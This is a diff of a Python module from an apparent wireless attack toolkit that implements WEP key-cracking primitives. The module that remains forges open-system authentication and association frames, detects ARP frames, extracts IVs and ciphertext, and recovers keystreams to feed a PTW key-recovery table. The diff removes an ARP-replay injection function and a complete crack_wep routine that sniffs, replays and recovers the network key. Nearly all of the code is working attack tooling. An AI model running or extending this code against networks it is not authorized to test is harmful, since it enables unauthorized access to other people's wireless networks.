@@ -1,5 +1,10 @@
-"""WEP attacks: fake authentication, ARP-request replay for IV harvesting,
-and turning captured frames into PTW sessions.
+"""WEP attack primitives: fake authentication and frame parsing.
+
+ARP-replay orchestration lives in `wep_replay.py`; full key-recovery
+orchestration lives in `wep_crack.py`. This module keeps the shared
+building blocks (fake-auth, ARP-candidate detection, IV/ciphertext
+extraction, PTW table feeding) so both attack paths can reuse them
+without importing each other's orchestration code.
 
 Logic cherry-picked from documented fake-auth and ARP-replay attack
 behavior (see research/wep_attacks_dim03.md) and reimplemented natively
@@ -13,16 +18,14 @@ decoding for fields where raw-byte layout is what actually matters.
 
 from __future__ import annotations
 
-import time
-
 from scapy.layers.dot11 import Dot11, Dot11WEP
 from scapy.packet import Packet
-from scapy.sendrecv import sendp, sniff
+from scapy.sendrecv import sendp
 
-from ..frames import BROADCAST, craft_assoc_req, craft_auth, with_forced_rate
-from ..radio import set_channel
+from ..frames import BROADCAST, craft_assoc_req, craft_auth
+from ..radio import ensure_channel
 from ..wep.crypto import recover_keystream
-from ..wep.ptw import PTWVoteTable, compute_key
+from ..wep.ptw import PTWVoteTable
 
 # LLC/SNAP header + EtherType for ARP — the known-plaintext prefix every
 # WEP ARP-based attack relies on (research/wep_attacks_dim02.md, dim06).
@@ -37,8 +40,7 @@ ARP_LEN_WIRED = 86
 
 def fake_authenticate(iface: str, bssid: str, client: str, ssid: str, channel: int | None = None) -> None:
     """Open-system auth + association so the AP accepts later injected frames."""
-    if channel is not None:
-        set_channel(iface, channel)
+    ensure_channel(iface, channel)
     sendp(craft_auth(bssid, client), iface=iface, verbose=False)
     sendp(craft_assoc_req(bssid, client, ssid=ssid), iface=iface, verbose=False)
 
@@ -66,19 +68,6 @@ def wep_iv_and_ciphertext(pkt: Packet) -> tuple[bytes, bytes] | None:
     return iv, ciphertext
 
 
-def replay_arp(iface: str, pkt: Packet, count: int = 500, interval: float = 0.01,
-                low_rate: bool = False) -> int:
-    """Reinject a captured WEP ARP-request frame repeatedly; returns count sent.
-
-    low_rate: force a 2 Mbps injection rate instead of replaying the
-    frame's own captured RadioTap -- see frames.with_forced_rate.
-    """
-    if low_rate:
-        pkt = with_forced_rate(pkt, mbps=2)
-    sendp(pkt, iface=iface, count=count, inter=interval, verbose=False)
-    return count
-
-
 def add_captured_frame_to_table(table: PTWVoteTable, pkt: Packet) -> bool:
     """If pkt is a usable WEP ARP frame, recover its keystream and vote it.
 
@@ -95,62 +84,3 @@ def add_captured_frame_to_table(table: PTWVoteTable, pkt: Packet) -> bool:
         return False
     keystream = recover_keystream(ciphertext, ARP_KNOWN_PREFIX)
     return table.add_session(iv, keystream)
-
-
-def crack_wep(
-    iface: str,
-    bssid: str,
-    client: str,
-    ssid: str,
-    key_len: int,
-    channel: int | None = None,
-    target_sessions: int = 40_000,
-    timeout: float = 300.0,
-    replay_batch: int = 500,
-    replay_interval: float = 0.01,
-    poll_interval: float = 2.0,
-    top_k: int = 16,
-    max_candidates: int = 200_000,
-    low_rate: bool = False,
-    sniff_fn=sniff,
-    sendp_fn=sendp,
-    auth_fn=fake_authenticate,
-    progress_fn=None,
-) -> bytes | None:
-    """Full attack: fake-auth, find one ARP frame, replay it, harvest IVs,
-    recover the key with PTW. Not yet live-tested (see STATUS.md) —
-    sendp/sniff/auth are injectable (whole-function injection, matching
-    omni.py's pmkid_fn/handshake_fn/deauth_fn pattern rather than
-    threading a sendp_fn down into fake_authenticate itself) so the
-    orchestration itself is unit-testable without touching hardware.
-
-    `top_k`/`max_candidates` default to the values empirically validated
-    in tests/test_wep_ptw.py (25k sessions, top_k=16), not compute_key's
-    own defaults (8/50_000), which weren't sufficient at that scale.
-
-    Returns the recovered root key, or None if `timeout` elapses first.
-    """
-    auth_fn(iface, bssid, client, ssid, channel=channel)
-
-    table = PTWVoteTable(num_positions=key_len)
-    deadline = time.monotonic() + timeout
-    seed_frame: Packet | None = None
-
-    def on_packet(pkt: Packet) -> None:
-        nonlocal seed_frame
-        if add_captured_frame_to_table(table, pkt):
-            if seed_frame is None:
-                seed_frame = with_forced_rate(pkt, mbps=2) if low_rate else pkt
-
-    while time.monotonic() < deadline and len(table.sessions) < target_sessions:
-        sniff_fn(iface=iface, timeout=poll_interval, prn=on_packet, store=False)
-        if progress_fn is not None:
-            pct = 100 * len(table.sessions) // target_sessions
-            progress_fn(f"WEP IVs: {len(table.sessions)}/{target_sessions} ({pct}%)"
-                        + ("  [replaying ARP]" if seed_frame is not None else "  [waiting for ARP seed]"))
-        if seed_frame is not None:
-            sendp_fn(seed_frame, iface=iface, count=replay_batch, inter=replay_interval, verbose=False)
-
-    if not table.sessions:
-        return None
-    return compute_key(table, key_len=key_len, top_k=top_k, max_candidates=max_candidates)
